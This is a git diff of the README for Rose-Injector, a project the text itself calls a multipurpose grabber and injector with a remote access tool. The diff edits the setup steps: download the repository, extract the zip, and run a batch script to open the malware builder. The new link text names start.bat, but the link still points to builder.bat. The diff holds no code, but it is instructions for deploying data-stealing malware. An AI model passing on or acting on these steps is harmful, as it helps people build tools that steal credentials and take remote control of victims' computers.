@@ -85,7 +85,8 @@ Rose is a powerful multipurpose grabber, injector, and includes a [RAT](https://
 ### <a id="setup"></a> Setup
 
 - Download the repository by clicking [here](https://github.com/DamagingRose/Rose-Injector/archive/refs/heads/main.zip).
-- Run the [`builder.bat`](https://github.com/DamagingRose/Rose-Injector/blob/main/builder.bat) to open up the Rose builder/Python installer.
+- Extract the .zip file by just right clicking on the file and clicking on extract ZIP or extract here.
+- Run the [`start.bat`](https://github.com/DamagingRose/Rose-Injector/blob/main/builder.bat) file to open up the Rose builder or Python installer if it is not installed.
 
 ## <a id="preview"></a> Preview
 
